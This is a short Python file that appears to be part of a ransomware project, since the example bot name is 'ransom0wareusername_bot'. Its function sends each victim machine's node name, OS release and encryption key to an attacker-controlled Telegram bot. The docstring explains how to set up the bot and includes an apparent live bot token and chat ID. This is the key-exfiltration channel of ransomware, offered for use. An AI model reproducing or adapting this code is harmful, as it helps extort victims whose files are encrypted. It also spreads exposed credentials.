import requests


def sendTelegramMessage(node, release, key):
    """
                Telegram api    (https://core.telegram.org/bots/api)

                1- open telegram
                2- search BotFather
                3- /newbot
                4- Choose a username for your bot (ransom0wareusername_bot)

                Use this token to access the HTTP API:
                3416572059:AAGB7p9WAe0jWamE89ftR02MR2WgbxlLZEg

                Chat Id

                1- search Json Dump Bot
                2- /start
                3- telegramapi

                "from": {
                    "id": 3213112048, your chat_id

                Send Message Example:

                requests.post("https://api.telegram.org/bot3416572059:AAGB7p9WAe0jWamE89ftR02MR2WgbxlLZEg/sendMessage",
                          data={"chat_id": "3213112048", "text": f"Node: {node} Release: {release} \nKey: {str(key)}"})

                requests.post("https://api.telegram.org/bot<your_telegram_api>/sendMessage",
                         data={"chat_id": "<your_telegram_chat_id>", "text": f"Node: {node} Release: {release} \nKey: {str(key)}"})

    """

    try:
        # telegram api https://core.telegram.org/bots/api
        requests.post("https://api.telegram.org/bot<your_telegram_api>/sendMessage",
                data={"chat_id": "<your_telegram_chat_id>", "text": f"Node: {node} Release: {release} \nKey: {str(key)}"})
        print("Telegram message sent.")

    except Exception:
        print("Telegram message could not be sent.")